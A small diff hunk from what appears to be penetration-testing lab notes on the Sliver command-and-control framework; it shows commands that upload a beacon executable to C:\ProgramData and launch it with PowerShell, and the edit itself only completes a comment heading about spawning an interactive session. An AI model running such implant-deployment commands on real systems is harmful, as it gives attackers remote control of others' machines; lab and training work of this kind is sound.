@@ -148,7 +148,7 @@ upload /home/kali/work/prolab/sliver/httpbeacon80fast.exe C:\\ProgramData\\fast.
 sliver > execute powershell.exe -Command "Start-Process C:\\ProgramData\\fast2.exe"
 # Run a command
 
-# Spawn an
+# Spawn an interactive session
 
 ```
 ## Cheatsheet
